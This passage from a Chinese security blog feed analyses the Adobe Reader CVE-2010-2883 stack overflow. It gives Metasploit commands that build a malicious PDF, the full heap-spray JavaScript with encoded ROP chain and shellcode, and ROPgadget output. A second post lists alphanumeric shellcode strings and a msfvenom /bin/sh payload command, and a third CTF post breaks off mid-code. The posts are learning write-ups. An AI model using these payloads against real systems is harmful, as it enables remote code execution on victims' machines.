  <script id="hbeData" type="hbeData" data-hmacdigest="896bbf823a5b33ccacfc7208675de240e7bf2c5708626dce7eb34e3ea3e0c3e7"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>二进制,pwn,逆向,writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞分析学习之cve-2010-2883</title>
    <url>/posts/78c3679c/</url>
    <content><![CDATA[<h1 id="漏洞分析学习之cve-2010-2883"><a href="#漏洞分析学习之cve-2010-2883" class="headerlink" title="漏洞分析学习之cve-2010-2883"></a>漏洞分析学习之cve-2010-2883</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打ctf打久了，也该学学漏洞分析了，不可能以后的工作就是打ctf吧，照着漏洞战争这本书开始学习吧</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25iZXRhLmNvbS9hcnRpY2xlcy90ZWNoLzEwMjAxMC5odG0=" title="https://www.cnbeta.com/articles/tech/102010.htm">adobe_reader_9.0_download<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9tc2RuLml0ZWxseW91LmNuLw==" title="https://msdn.itellyou.cn/">win_xp_sp3<i class="fa fa-external-link"></i></span></p><p>vmware 自己下吧</p><p>工具：</p><ul><li>吾爱破解od</li><li>010editor</li><li>PdfStreamDumper</li></ul><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>配好环境后 开始动工</p><h2 id="样本生成"><a href="#样本生成" class="headerlink" title="样本生成"></a>样本生成</h2><p>先生成一个弹calc的吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search adobe_cooltype_sing</span><br><span class="line">use exploit/windows/fileformat/adobe_cooltype_sing/</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/<span class="built_in">exec</span></span><br><span class="line"><span class="built_in">set</span> CMD calc.exe</span><br><span class="line">show option</span><br><span class="line"><span class="built_in">set</span> FILENAME cve2010.pdf</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>放到虚拟机</p><p>运行起来</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114095940.png" alt></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="漏洞点查找"><a href="#漏洞点查找" class="headerlink" title="漏洞点查找"></a>漏洞点查找</h3><p>如果让我审一个软件的话，这太难了。。光敏感函数都可能有好多吧，比如这里就是strcat，<br>这个strcat是个敏感函数，让我纯手动审出这个点，我觉得对于现在的我来说不现实，所以，漏洞点这部分直接过了吧，假设已知漏洞点，利用吧</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>玩惯了ctf, 通常pwn题就是给个exp就可以一把梭，编写exp也是门艺术，那是python语言，现在这个要产生exp,emm，就是用msf这个框架了，我们要生成一个pdf,方便我们利用，所以开始我们的学习旅程吧，学ruby,学js</p><p>发觉从头开始构造太难了，直接分析部分代码吧，我看了下pdf构造部分。。好麻烦，所以应该抽丝剥茧，将pdf构造和原理部分分开，</p><p>我这边只分析下ROP链过程，因为我只会这部分，pdf构造还不会</p><p>至于pdf部分，还是用现成的吧。。还要看官方文档来构造</p><h4 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h4><p>用ida打开CoolType.dll库(这个库在adobe_reader目录下)，搜索SING，定位到这个函数，看到strcat，盲猜也是这里有问题了，</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114100102.png" alt></p><p>其余具体漏洞战争那本书已经讲了，照着样本分析部分做一遍</p><p>010editor可以设置模板解析文件，网上下个模板就行<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuMjE5Lm1lL3Bvc3RzLzI4NTUuaHRtbA==" title="https://www.219.me/posts/2855.html">下载地址<i class="fa fa-external-link"></i></span></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114100712.png" alt></p><p>dump出结构数据，查看SING部分</p><p>根据ida那里获得的地址下断，<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114101405.png" alt></p><p>断在这里，</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114101443.png" alt></p><p>看strcat部分，是将恶意数据复制到ebp所指地点</p><p>继续f8单步，单步到这里执行直接弹计算器了，下断再次运行，这里如果弹到7C地址处，可以按减号回退到地址处<br>0803DDA8 E8 E98DFDFF call CoolType.08016B96</p><p>再次运行在<br>08016C0E E8 C64E0000 call CoolType.0801BAD9<br>这里跑起来了，继续重复<br>0801BAF9 FF10 call dword ptr ds:[eax] ; CoolType.0808AFCE</p><p>再次重复</p><p>最后定位到这里<br>0808B1C0 FF10 call dword ptr ds:[eax] ; icucnv36.4A80CB38</p><p>F7进去<br>4A80CB38 81C5 94070000 add ebp,0x794<br>4A80CB3E |. C9 leave<br>4A80CB3F . C3 retn</p><p>发觉进行了栈底的提高，<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114103926.png" alt></p><p>发觉这个栈迁移到我们原来写入的地方了<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114102632.png" alt></p><p>也就是说我们控制了eip,从图中还可以看出，这是c++的虚表攻击，覆盖了虚表指针，让他跳转到这里，然后进行了栈迁移<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114104211.png" alt></p><p>这里在将栈迁移到0x0C0C0C0C部分，很容易联想到heap spray,大概就是将eip转到对去的0x0C0C0C0C部分，然后用js申请大量堆内存，并且包含着slide(滑板)和shellcode的内存片,申请的内存超过200M就可以大于0x0C0C0C0C,然后通过滑板对shellcode无影响，提高shellcode命中执行率</p><p>后面继续执行创建临时文件</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114104803.png" alt></p><p>└──╼ $strings icucnv36.dll|grep iso<br>iso-ir-165<br>iso88591<br>iso2022</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114205019.png" alt></p><p>这里从库中存的取出任意都行，不一定得iso这个，不过可能这个好找？<br>然后执行函数，参数都放栈里了</p><p>后面的函数同理可得</p><p>创建CreateFileMap<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114104818.png" alt></p><p>接着MapViewOfFile<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114105311.png" alt></p><p>在接下去memcpy<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114105328.png" alt></p><p>然后是shellcode<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114105353.png" alt></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvZnRuL2FydGljbGUvZGV0YWlscy81MTc0MDM1MQ==" title="https://blog.csdn.net/softn/article/details/51740351">映射部分<i class="fa fa-external-link"></i></span></p><p>createfilemapping 用来建立内存映象文件，原型如下：<br>HANDLE CreateFileMapping(<br>HANDLE hFile, //文件句柄<br>LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // 可选安全属性<br>DWORD flProtect, // 映象文件保护方式<br>DWORD dwMaximumSizeHigh, // 映象文件区域的底值<br>DWORD dwMaximumSizeLow, // 映象文件区域的顶值<br>LPCTSTR lpName // 映象文件的名字 );</p><p>mapviewoffile用来访问映象文件，该函数会返回一个指向共享内存块的特定指针。原型如下：<br>LPVOID MapViewOfFile(<br>HANDLE hFileMappingObject, // 映象文件句柄<br>DWORD dwDesiredAccess, // 访问方式<br>DWORD dwFileOffsetHigh, // 映象文件区域的底值<br>DWORD dwFileOffsetLow, // 映象文件区域的顶值<br>DWORD dwNumberOfBytesToMap // 映射字节数 );<br>其中如果 dwNumberOfBytesToMap 是0，表示映射整个文件。</p><p>然后在复制shellcode</p><p>整个攻击流程就是通过strcat溢出，攻击虚表指针，然后通过ROP，移动到我们的栈位置，在通过栈迁移，移动到0x0C0C0C0C部分(联想到堆喷射)，在接着就是通过ROP执行shellcode，整体流程就是这样<br>动态复现部分就是这样</p><h4 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h4><p>通过PdfStreamDumper dump出js数据</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> kQaZHCkIwASUmfcZmiIDLaVOqfgXDNAZipbOhbFhZFgjkCy = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> xzZCr = kQaZHCkIwASUmfcZmiIDLaVOqfgXDNAZipbOhbFhZFgjkCy( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud0d9%u74d9%uf424%u295b%ub1c9%ub831%ucdd3%ub89c%u4331%u0318%u1843%uc383%u2fd7%u4469%u2d3f%ub592%u52bf%u501a%u528e%u1078%u62a0%u740a%u084c%u6d5e%u7cc7%u8277%uca60%uada1%u6771%uac91%u7af1%u0ec6%ub4c8%u4e1b%ua80d%u02d6%ua6c6%ub345%uf263%u3855%u123f%uddde%u15f7%u73cf%u4f8c%u72cf%ue441%u6d46%uc186%u0611%ubd7c%ucea3%u3e4d%u2f0f%ucd62%u7751%u2e44%u8124%ud3b7%u563f%u0fca%u4db5%udb6c%uaa6d%u088d%u39eb%ue581%u657f%uf885%u1dac%u71b1%uf253%uc130%ud670%u9119%u4f19%u74c7%u8f25%u29a8%udb83%u3d44%u81be%uc002%ubc4c%uc260%ubf4e%uabd4%u347f%uacbb%u9f7f%u43f8%u82ca%ucba8%u5693%u91e9%u8d23%uac2d%u24a7%u4bcd%u4cb7%u10c8%ubc7f%u09a0%uc2ea%u2917%ua13f%ub9f6%u08a3%u399d%u5541'</span> );</span><br><span class="line"><span class="keyword">var</span> PtsP = kQaZHCkIwASUmfcZmiIDLaVOqfgXDNAZipbOhbFhZFgjkCy( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (PtsP.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) PtsP+=PtsP;</span><br><span class="line">QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS = PtsP.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS += xzZCr;</span><br><span class="line">QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS += PtsP;</span><br><span class="line">LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF = QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF.length &lt; <span class="number">0x80000</span>) LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF += LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF;</span><br><span class="line">vYpKSywUKtOzmIcaRAYPqZsGKRQBZeikke = LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> kXBj = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu=<span class="number">0</span>;bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu&lt;<span class="number">0x1f0</span>;bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu++) kXBj[bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu]=vYpKSywUKtOzmIcaRAYPqZsGKRQBZeikke+<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure><p>emm， msf生成的这个变量命名有点长啊，不过大概还是能看懂的，毕竟这种命名规范逆向都遇到过。。。<br>将他解成易懂的代码吧</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud0d9%u74d9%uf424%u295b%ub1c9%ub831%ucdd3%ub89c%u4331%u0318%u1843%uc383%u2fd7%u4469%u2d3f%ub592%u52bf%u501a%u528e%u1078%u62a0%u740a%u084c%u6d5e%u7cc7%u8277%uca60%uada1%u6771%uac91%u7af1%u0ec6%ub4c8%u4e1b%ua80d%u02d6%ua6c6%ub345%uf263%u3855%u123f%uddde%u15f7%u73cf%u4f8c%u72cf%ue441%u6d46%uc186%u0611%ubd7c%ucea3%u3e4d%u2f0f%ucd62%u7751%u2e44%u8124%ud3b7%u563f%u0fca%u4db5%udb6c%uaa6d%u088d%u39eb%ue581%u657f%uf885%u1dac%u71b1%uf253%uc130%ud670%u9119%u4f19%u74c7%u8f25%u29a8%udb83%u3d44%u81be%uc002%ubc4c%uc260%ubf4e%uabd4%u347f%uacbb%u9f7f%u43f8%u82ca%ucba8%u5693%u91e9%u8d23%uac2d%u24a7%u4bcd%u4cb7%u10c8%ubc7f%u09a0%uc2ea%u2917%ua13f%ub9f6%u08a3%u399d%u5541'</span> );</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span>(b.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">0x10000</span>) b+=b;</span><br><span class="line">c = b.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">c += a;</span><br><span class="line">c += b;</span><br><span class="line">d = c/substring(<span class="number">0</span>, <span class="number">0x10000</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(d.length &lt; <span class="number">0x80000</span>) d += d;</span><br><span class="line">e = d.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>)/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) array[i] = e + <span class="string">"s"</span></span><br></pre></td></tr></table></figure><p>我这命名规范别喷了。。。我也知道菜。不知道命名成啥<br>b就是0x0C0C0C0C,滑板来的，代码就是or al,0x0c,这种滑板<br>emm</p><p>顺便分析下吧，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(b.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">0x10000</span>) b+=b;</span><br><span class="line">c = b.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">c += a;</span><br><span class="line">c += b;</span><br></pre></td></tr></table></figure><p>这部分，就是计算到1/10mb，这里以1/10mb为一个单元块，在减掉结构部分大小，加上shellcode<br>然后在填充8份</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(d.length &lt; <span class="number">0x80000</span>) d += d;</span><br><span class="line">e = d.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>)/<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>最后便是关键</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) array[i] = e + <span class="string">"s"</span></span><br></pre></td></tr></table></figure><p>这里是以0x80000为一个单位块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0x80000</span>*<span class="number">0x1f0</span>)</span><br><span class="line"><span class="string">'0xf800000'</span></span><br></pre></td></tr></table></figure><p>所以这里实际上早就超过了0x0C0C0C0C，所以只要ROP迁移到这里，就可以执行shellcode的了</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>假设给你一个恶意pdf，如何快速分析找到漏洞点？</li><li>如何进行修复</li></ol><p>第一个问题，我目前只会找敏感函数，所以暂时放着了</p><p>第二个修复部分，用strncat就可以了，带长度的，后面修复就是通过strncat加上动态分配，这样就没有栈溢出了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>我觉得难的部分还是pdf的构造。我不会构造这部分，emm</li><li>rop部分一样可以用ROPgadget获得<br>└──╼ $ROPgadget –binary icucnv36.dll | grep ‘add ebp’<br>0x4a805afc : add al, 0 ; add ebp, 0x1fc ; leave ; ret<br>0x4a82748c : add al, 0x75 ; add ebp, dword ptr [edx + 2] ; pop eax ; ret<br>0x4a8221c2 : add al, byte ptr [eax] ; add ebp, 0x104 ; leave ; ret 4<br>0x4a81fba6 : add al, byte ptr [eax] ; add ebp, 0x148 ; leave ; ret<br>0x4a81fe1a : add al, byte ptr [eax] ; add ebp, 0x160 ; leave ; ret<br>0x4a8225b1 : add al, byte ptr [eax] ; add ebp, 0x18c ; leave ; ret<br>0x4a82683d : add al, byte ptr [eax] ; add ebp, 0x394 ; leave ; ret<br>0x4a8241b7 : add al, byte ptr [eax] ; add ebp, 0x3a0 ; leave ; ret<br>0x4a825227 : add al, byte ptr [eax] ; add ebp, 0x60 ; leave ; ret<br>0x4a82038e : add al, byte ptr [eax] ; add ebp, 0x64 ; leave ; ret<br>0x4a825011 : add al, byte ptr [eax] ; add ebp, 0x6c ; leave ; ret<br>0x4a8239f5 : add al, byte ptr [eax] ; add ebp, 0x6c ; leave ; ret 0xc<br>0x4a82391a : add al, byte ptr [eax] ; add ebp, 0x70 ; leave ; ret 8<br>0x4a82536d : add al, byte ptr [eax] ; add ebp, 0x78 ; leave ; ret<br>0x4a8233a0 : add al, byte ptr [eax] ; add ebp, 0x84 ; leave ; ret<br>0x4a82365f : add al, byte ptr [eax] ; add ebp, 0x88 ; leave ; ret<br>0x4a825594 : add al, byte ptr [eax] ; add ebp, 0x90 ; leave ; ret<br>0x4a826235 : add al, byte ptr [eax] ; add ebp, 0xb0 ; leave ; ret<br>0x4a83892d : add byte ptr [eax], al ; add ebp, 0x18c ; leave ; ret 0xc<br>0x4a84126f : add byte ptr [eax], al ; add ebp, 0x210 ; leave ; ret<br>0x4a84040c : add byte ptr [eax], al ; add ebp, 0x398 ; leave ; ret 0x18<br>0x4a83bf56 : add byte ptr [eax], al ; add ebp, 0x474 ; leave ; ret<br>0x4a841791 : add byte ptr [eax], al ; add ebp, 0x60 ; leave ; ret<br>0x4a83989a : add byte ptr [eax], al ; add ebp, 0x64 ; leave ; ret 0x14<br>0x4a83909d : add byte ptr [eax], al ; add ebp, 0xc0 ; leave ; ret 4<br>0x4a827f19 : add dword ptr [eax], eax ; add ebp, 0x17c ; leave ; ret<br>0x4a828f1f : add dword ptr [eax], eax ; add ebp, 0x1cb4 ; leave ; ret<br>0x4a82b5f2 : add dword ptr [eax], eax ; add ebp, 0x264 ; leave ; ret 0xc<br>0x4a82b10e : add dword ptr [eax], eax ; add ebp, 0x40c ; leave ; ret 0x18</li><li>至于攻击过程，这是以前洞的一个常见思路，创建临时文件，然后内存映射，最后复制shellcode</li><li>pdf构造可以参考 参考链接中的安全客师傅发的</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2VydC1pc3QuY29tL3B1YmxpYy9lbi9TT19kZXRhaWw/Y29kZT1tYWxpY2lvdXNfcGRm" title="https://www.cert-ist.com/public/en/SO_detail?code=malicious_pdf">深入浅出讲pdf恶意文档<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZGllcnN0ZXZlbnMuY29tLzIwMDgvMDQvMjkvcGRmLWxldC1tZS1jb3VudC10aGUtd2F5cy8=" title="https://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/">PDF, Let Me Count the Ways…<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTc5NjgxI2gyLTY=" title="https://www.anquanke.com/post/id/179681#h2-6">安全客师傅分析<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/78c3679c/">https://noone-hub.github.io/posts/78c3679c/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>实战</category>
      </categories>
      <tags>
        <tag>pwn， 漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/posts/8002891b/</url>
    <content><![CDATA[<h1 id="纯字母数字shellcode存放"><a href="#纯字母数字shellcode存放" class="headerlink" title="纯字母数字shellcode存放"></a>纯字母数字shellcode存放</h1><h2 id="x64-shellcode"><a href="#x64-shellcode" class="headerlink" title="x64 shellcode"></a>x64 shellcode</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">'PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA'</span></span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9oYW1hLmhhdGVuYWRpYXJ5LmpwL2VudHJ5LzIwMTcvMDQvMDQvMTkwMTI5" title="https://hama.hatenadiary.jp/entry/2017/04/04/190129">文章地址<i class="fa fa-external-link"></i></span></p><h2 id="x86-shellcode"><a href="#x86-shellcode" class="headerlink" title="x86 shellcode"></a>x86 shellcode</h2><p>msf生成命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/<span class="built_in">exec</span> CMD=<span class="string">"/bin/sh"</span> -e x86/alpha_upper BufferRegister=eax</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA'</span></span><br></pre></td></tr></table></figure><h2 id="alpha3工具生成"><a href="#alpha3工具生成" class="headerlink" title="alpha3工具生成"></a>alpha3工具生成</h2><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>sc.bin可以从pwntools里的shellcraft.sh生成，或者其他途径</p><p>linux下无法运行，将ALPHA3.py的import test这个test删掉就行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python shellcode.py &gt; sc.bin</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc.bin"</span> &gt; out.bin</span><br></pre></td></tr></table></figure><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python ./ALPHA3.py x86 ascii uppercase eax --input=<span class="string">"sc.bin"</span> &gt; out.bin</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/8002891b/">https://noone-hub.github.io/posts/8002891b/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>shellcode</category>
      </categories>
  </entry>
  <entry>
    <title>funny-stack</title>
    <url>/posts/d70e4493/</url>
    <content><![CDATA[<h1 id="有趣的栈题目"><a href="#有趣的栈题目" class="headerlink" title="有趣的栈题目"></a>有趣的栈题目</h1><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80486EC();</span><br><span class="line">  sub_80485E7();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80486EC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+1Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter your name "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%9s"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome %s to participate the 429 ctf!\n"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80485E7</span><span class="params">()</span></span></span><br><span class="line"><span 